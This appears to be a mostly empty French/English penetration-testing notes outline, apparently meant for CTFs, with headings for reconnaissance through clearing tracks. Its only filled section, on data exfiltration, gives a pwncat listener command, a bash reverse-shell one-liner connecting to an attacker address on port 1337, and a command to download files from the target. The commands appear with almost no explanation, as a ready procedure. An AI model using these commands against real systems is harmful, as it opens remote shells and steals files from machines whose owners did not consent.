# Reconnaissance
# Scanning & Enumeration


# Exploitation (Gaining Access)
# Exfiltration de données
Utilisation de pwncat:
1. Côté attaquant:
<code>pwncat-cs -lp 1337</code>

2. Côté cible
<code>bash -c 'bash -i >& /dev/tcp/$YOUR_IP/1337 0>&1'</code>

3. Côté attaquant
<code>download /chemin/fichier</code>

# Privilege Escalation
# Command & Control (Persistence/Maintaining Access)
# Clearing Tracks (usually not necessary in CTF’s, but good practice)

# Resources
